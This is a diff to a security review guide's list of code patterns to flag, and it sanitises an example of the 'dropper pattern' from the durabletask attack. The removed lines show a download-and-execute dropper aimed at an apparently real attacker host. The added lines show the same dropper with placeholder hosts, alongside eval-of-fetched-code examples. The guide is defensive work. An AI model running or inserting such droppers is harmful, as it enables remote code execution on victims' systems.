@@ -38,11 +38,13 @@ Flag any code that:
 - Examples: `subprocess.run(['curl', url])` followed by `subprocess.run([...downloaded...])`, `urllib.request.urlretrieve(...)` followed by `exec(...)`, `fetch(url).then(r => eval(r.text()))`
 - Decodes base64 or hex strings and passes them to `eval`, `exec`, `subprocess`, `Function()`, `vm.runInThisContext()`
 
-These are the **dropper pattern** from the durabletask attack:
+These are the **dropper pattern** from the durabletask attack. The example below uses placeholder hostnames and filenames; the real attack used a freshly-registered domain pretending to be a git-related service and a Python ZIP-app payload.
 
 ```python
-urllib.request.urlretrieve("https://check.git-service.com/rope.pyz", "/tmp/managed.pyz")
-subprocess.Popen(["python3", "/tmp/managed.pyz"], start_new_session=True)
+# Pattern (sanitised — DO NOT use real IOCs in documentation,
+# anti-malware engines flag them).
+urllib.request.urlretrieve("https://<ATTACKER-HOST>/<PAYLOAD>", "/tmp/<STAGE2>")
+subprocess.Popen(["python3", "/tmp/<STAGE2>"], start_new_session=True)
 ```
 
 Severity: **critical**.
